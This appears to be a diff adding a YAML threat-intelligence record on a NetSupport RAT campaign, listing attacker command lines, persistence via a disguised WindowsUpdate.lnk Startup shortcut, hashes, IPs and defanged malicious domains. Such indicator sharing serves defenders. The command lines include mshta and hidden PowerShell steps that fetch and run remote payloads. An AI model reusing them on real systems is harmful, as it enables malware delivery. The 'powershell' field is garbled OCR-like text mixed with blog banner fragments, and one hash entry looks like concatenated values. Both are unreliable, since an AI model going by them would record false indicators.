@@ -1,0 +1,102 @@
+description: Attacker downloads NetSupport RAT via a ZIP archive, extracts it into
+  ProgramData, executes it indirectly through JScript, and establishes persistence
+  using a Startup shortcut.
+malware_families:
+- NetSupport RAT
+- SERPENTINE#CLOUD
+TTPs:
+  processes:
+  - mshta.exe
+  - powershell.exe
+  - wscript.exe
+  - client32.exe
+  - cmd.exe
+  commandline:
+  - mshta.exe https://stoneandjon[.]com/tue/day.php?58DyXF8
+  - powershell -ExecutionPolicy Bypass -File <path>
+  - $final | powershell
+  - wscript.exe //B run.js
+  - powershell.exe -NoProfile -WindowStyle Hidden -File $DownloadPath
+  - cmd.exe /c start $forwardPath
+  powershell:
+  - Write-Output $final | powershell -
+  - 'param ([string]$SDownloadPath, [string]$SExtractPath) {} $progressPreference=
+    ;$DownloadPath - $progressPreference=) - $DownloadPath -- $ExtractPath -FilterexeFile)
+    { $forwardPath=$exeFile NjsContent |Hidden;$)sPath;$startupPath=[$WScriptshell=($shortcutPath)
+    ;$shortcut.$startupPath$Shortcut=$WScriptShell.$shortcut.Arg tasw()JSExtractPathstry
+    { 1fSEXTIATTYVATH =7 I- $url -if ( $DownloadPath$ExtractPath - } SexeFile=| -$9sContent=;
+    $)sPath=] (Senv:) ; $shortcutPaths=$Shortcut= ; $shortcut-amuTon55$5555555SSSSSSS
+    EEREEEEEEEEEEEEEEEEE55555555555555RRRRRRRxR RERRRRa2 N . .B RRRRRTN RRRRRZB zx
+    N& 282 zN N= NRRRRRRARgB<=NsRRRRRREECCEELEEECEEEEEELELECE$s$5555555555555SeRzazRCECEECEEREEEEEEEEEEEEAMMMMAARRRATLRRRAZARRARE:
+    wrA00000000 ANANNNAN MNNNN T YOO OO0) 0 ~ ~ ~ x x x x00 % ~ ~ ~ X X X xX x xx
+    o0txX XX xx xPR2..SOE THONEXSOE THONEXsecuroni{ | THREAT LABSCHAMELEON#NETA Deep
+    Dive into Multi-Stage .NETMalware Leveraging ReflectiveLoading and Custom Decryptionfor
+    Stealthy Operationssecuronip< | THREAT LABSAnalyzing SERPENTINE#CLOUD: ThreatActors
+    Abuse Cloudflare Tunnels toInfect Systems with Stealthy Python-Based MalwareSECUronix<
+    | THREAT LABSINTELLIGENCE 2INSIGHTS &November 2023SECUronix< | THREAT LABSINTELLIGENCE
+    (2INSIGHTS W<October 2023\\()'
+  scripting_engine:
+  - JScript
+  - VBS
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - https://stoneandjon[.]com/tue/day.php?58DyXF8
+  - https://kindstki[.]com/qazx.zip
+  - 85.158.111.35
+  file_activity:
+  - C:\\ProgramData\\CommunicationLayer\\
+  - '%TEMP%\\temp_file_to_run.ps1'
+  - C:\\ProgramData\\CommunicationLayer\\client32.exe
+  - C:\\Users\\researcher\\Desktop>node safe_run.js
+  - C:\\Users\\researcher\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk
+  - $DownloadPath
+  - $ExtractPath
+  - $forwardPath
+  - $shortcutPath
+  persistence:
+  - Disguised Startup shortcut
+  - Startup shortcut named WindowsUpdate.lnk pointing to wscript.exe running run.js
+    in background mode
+  - Creating a shortcut in the startup folder
+  process_relations: []
+IOCs:
+  hashes:
+  - fe8400a81be3de95807396ffa1539e6818c8c586bd8a17d833a573aa5d7b433b
+  - 246d7d74deaa27eaad25c97fa302d128a1c8d58058ce4cc95fd6055acbc9b959
+  - a89b471528737b91046fc42527bf84008b067908ccc1bf4318135476c290de6155ad68ee73fa288698cd3b885196d0d02cdfd417563d247f617bca288243bf4415a3cd9fc6f3e89fc4901be19b15069ccef0dcdd8071b4900448bf2ab374c00224a8660ebdf54094d8e787486f19b2823f3bc4382f5ace764429a6b7e48025eafced9291b4339c4fe3a1abfe5878d210a500afa7e1fa4a3be8613a6791c02b8e
+  - 4f0494cf85322d540e9cb87295af1247377bcb65b09254900b7ca29f6f46508ffced9291b4339c4fe3a1abfe5878d210a500afa7e1fa4a3be8613a6791c02b8e
+  - 9ce88cc6fd2e3d298b97592d431c301d994f9c4ed7a7886c225e167bce29c046
+  - 99744720b128c6ac678a1d6e0fad0e69f159c1606428e91e7d2b7695cc353a80
+  - 06a0a243811e9c4738a9d413597659ca8d07b00f640b74adc9cb351c179b3268
+  ip_addresses:
+  - 89.46.38.48
+  - 85.158.111.126
+  - 85.158.111.35
+  - 104.21.8.48
+  - 85.158.111.123
+  - 98.142.251.26
+  - 89.46.38.126
+  - 85.158.111.113
+  - 98.142.251.75
+  domains:
+  - boriver[.]com
+  - stoneandjon[.]com
+  - kindstki[.]com
+  - cpajoliette[.]com
+  - emoteragoddess[.]com
+  - srimedhasoft[.]com
+  - byspotikfy[.]com
+  - frostshiledr[.]com
+  - centaurustermas[.]com
+  urls:
+  - https://boriver[.]com/call/phone.js
+  - https://stoneandjon[.]com/tue/day.php?58DyXF8
+  - https://kindstki[.]com/qazx.zip
+authors:
+- Akshay Gaikwad
+- Shikha Sangwan
+- Aaron Beardslee
+reference: https://www.securonix.com/blog/jssmuggler-multi-stage-hidden-iframes-obfuscated-javascript-silent-redirectors-netsupport-rat-delivery
+date_of_publication: December 09, 2025
+file_creation_date: December 09, 2025
